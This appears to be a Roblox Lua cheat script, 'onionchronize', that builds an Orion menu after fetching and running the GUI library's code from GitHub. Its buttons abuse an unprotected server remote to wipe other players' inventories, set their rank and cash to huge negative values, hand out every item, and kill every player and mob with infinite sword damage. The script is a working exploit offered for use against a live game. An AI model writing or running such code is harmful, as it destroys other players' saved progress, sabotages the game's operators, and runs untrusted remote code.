local Orion = loadstring(httpget('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()

local Players = game:GetService("Players")
local HtttpService = game:GetService("HttpService")

local CurPlr = Players.LocalPlayer

local Window = Orion:MakeWindow({Name = "onionchronize v0.0.1", HidePremium = false, SaveConfig = true, ConfigFolder = "Orion"})

local Main = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local MainControl = game.ReplicatedStorage.MainControl
local GuiControl = CurPlr.PlayerGui.Inventory.GuiControl

local TARGET = '[{"itemid":1,"equipped":false}]'

local function SetValue(Inst : Instance, VALUE)
	MainControl:InvokeServer({
		["command"] = "setvalue", 
		["instance"] = Inst,
		["value"] = VALUE
	})
end

Main:AddButton({
	Name = "Wipe all Expect Urself",
	Callback = function()
		for i, Plr in Players:GetPlayers() do
			if not (Plr  == CurPlr) then
	            SetValue(Plr.realstats.Inventory, TARGET)
				SetValue(Plr.realstats.Rank, -5555555)
				SetValue(Plr.realstats.Cash, -math.huge)
			end
        end
	end
})

local CURRENTITEMS = MainControl:InvokeServer({
		["command"] = "getfolder", 
		["folder"] = "items"
})

local function FindItemWithString(TargetSTR : string)
	for ID, ITEMT in CURRENTITEMS do
		local NameT = ITEMT["name"]
		if string.find(string.lower(NameT), string.lower(TargetSTR)) then
			return ID
		end
	end
	return nil
end

local CurrItemTarget

Main:AddTextbox({
	Name = "Give Target Item",
	Default = "Item Name or ID here",
	TextDisappear = false,
	Callback = function(v)
		CurrItemTarget = v
	end
})

Main:AddButton({
	Name = "Insert Target Item",
	Callback = function()
	    local ID = FindItemWithString(CurrItemTarget and (tonumber(CurrItemTarget) and "" or CurrItemTarget) or "")
		GuiControl:Invoke({command = "insert", id = (CurrItemTarget and (tonumber(CurrItemTarget) and tonumber(CurrItemTarget) or (ID or 1)) or 1)})
	end
})

local EveryItemTemplate = {}

local function LoadTemplate()
	for ID, ITEMT in CURRENTITEMS do
		EveryItemTemplate[#EveryItemTemplate + 1] = {
			["itemid"] = ID,
			["equipped"] = false
		}
	end
	EveryItemTemplate = HtttpService:JSONEncode(EveryItemTemplate)
end

Main:AddButton({
	Name = "Give Everyone Every item (this changes the data)",
	Callback = function()
	    if not (typeof(EveryItemTemplate) == "string") then
		    LoadTemplate()
	    end
	    for i, Plr in Players:GetPlayers() do
	        SetValue(Plr.realstats.Inventory, EveryItemTemplate)
        end
	end
})

Main:AddButton({
	Name = "Kill Every Player, Mobs, Mines (Equip Sword)",
	Callback = function()
	    for _, v in workspace:GetDescendants() do
	        if v:IsA("Humanoid") then
				if CurPlr.Character then
					if v.Parent == CurPlr.Character then
						continue
					end
				end
		        local FoundSword = CurPlr.Backpack:FindFirstChild("Sword") or (CurPlr.Character and CurPlr.Character:FindFirstChild("Sword") or nil)
				if FoundSword then
					task.defer(function()
					    FoundSword.RemoteFunction:InvokeServer("hit", {v, math.huge})
				    end)
				else
				    Orion:MakeNotification({
	                    Name = "Equip Sword!!!!",
	                    Content = "Equip Sword!!!",
	                    Image = "rbxassetid://4483345998",
	                    Time = 5
                    })
				    break
				end
	        end
        end
	end
})
